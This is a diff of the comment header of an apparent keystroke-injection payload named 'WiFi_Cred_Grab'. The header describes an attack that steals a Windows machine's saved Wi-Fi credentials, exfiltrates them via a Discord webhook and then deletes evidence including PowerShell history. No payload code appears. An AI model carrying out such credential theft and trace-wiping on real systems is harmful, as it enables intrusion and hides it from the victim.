@@ -1,9 +1,9 @@
 REM Title: WiFi_Cred_Grab
 REM Author: LulzAnarchyAnon
-REM Description: A hidden powershell is opened, and the targets wifi credentials are saved to a txt file in C:\Users\Public\.
-REM Description: They are then exfiltrated uing a discord webhook. In the final stage of the payload the loot.txt file, the 
+REM Description: A hidden powershell is opened, and the targets wifi credentials are saved to a txt file in C:\Users\Public\
+REM They are then exfiltrated uing a discord webhook. In the final stage of the payload the loot.txt file, the 
 REM recycling bin contents, the temp folder contents and powershell history are all deleted. 
-REM Description: REM This payload deployed, and was completed in a test run in 9.97 seconds
+REM This payload deployed, and was completed in under 10 seconds
 REM Target: Windows 10 and 11
 REM Props: Darren Kitchen and I am Jakoby
 REM Version: 1.0
